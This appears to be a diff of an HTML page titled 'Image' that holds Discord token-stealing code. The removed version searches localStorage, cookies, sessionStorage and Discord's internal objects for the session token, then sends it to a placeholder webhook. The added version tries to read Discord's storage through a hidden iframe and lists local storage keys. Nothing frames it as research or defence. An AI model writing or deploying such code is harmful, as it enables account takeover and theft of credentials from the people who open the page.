@@ -1,70 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Image</title>
-</head>
 <body>
     <script>
-        // Multiple methods to grab Discord token
-        function grabToken() {
-            // Method 1: localStorage (old method)
-            let token = localStorage.getItem('token');
-            if (token) return { method: 'localStorage', token: token };
+        // Check if we're on the right origin
+        document.write('Current origin: ' + window.location.origin + '<br><br>');
+        
+        // Try to access Discord's localStorage directly
+        try {
+            // Open Discord in an iframe to access its storage
+            let iframe = document.createElement('iframe');
+            iframe.src = 'https://discord.com/app';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
             
-            // Method 2: Check all localStorage keys
-            for (let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                if (key && key.includes('token')) {
-                    let val = localStorage.getItem(key);
-                    if (val && val.length > 50) {
-                        return { method: 'localStorage-' + key, token: val };
-                    }
+            setTimeout(function() {
+                try {
+                    let discordStorage = iframe.contentWindow.localStorage;
+                    let token = discordStorage.getItem('token');
+                    document.write('Token from iframe: ' + (token || 'null') + '<br>');
+                } catch(e) {
+                    document.write('Iframe error: ' + e.message + '<br>');
                 }
-            }
-            
-            // Method 3: Cookies
-            let cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                cookie = cookie.trim();
-                if (cookie.startsWith('token=')) {
-                    return { method: 'cookie', token: cookie.substring(6) };
-                }
-            }
-            
-            // Method 4: Try to access Discord's internal objects
-            try {
-                if (window.__DISCORD) {
-                    return { method: '__DISCORD', token: window.__DISCORD.token };
-                }
-            } catch(e) {}
-            
-            // Method 5: Check sessionStorage
-            try {
-                let sessToken = sessionStorage.getItem('token');
-                if (sessToken) return { method: 'sessionStorage', token: sessToken };
-            } catch(e) {}
-            
-            return null;
+            }, 3000);
+        } catch(e) {
+            document.write('Error: ' + e.message + '<br>');
         }
         
-        let result = grabToken();
-        
-        if (result) {
-            document.write('Found token via ' + result.method + ':<br>');
-            document.write('<textarea style="width:500px;height:100px;">' + result.token + '</textarea>');
-            
-            // Send to webhook
-            var webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: '```' + result.token + '```' })
-            }).catch(function() {});
-        } else {
-            document.write('No token found.<br>');
-            document.write('Make sure you are logged into Discord in this browser.<br>');
-            document.write('Try opening discord.com in this browser first.');
+        // List all localStorage keys
+        document.write('<br>localStorage keys on this page:<br>');
+        for (let i = 0; i < localStorage.length; i++) {
+            document.write(localStorage.key(i) + '<br>');
         }
     </script>
 </body>
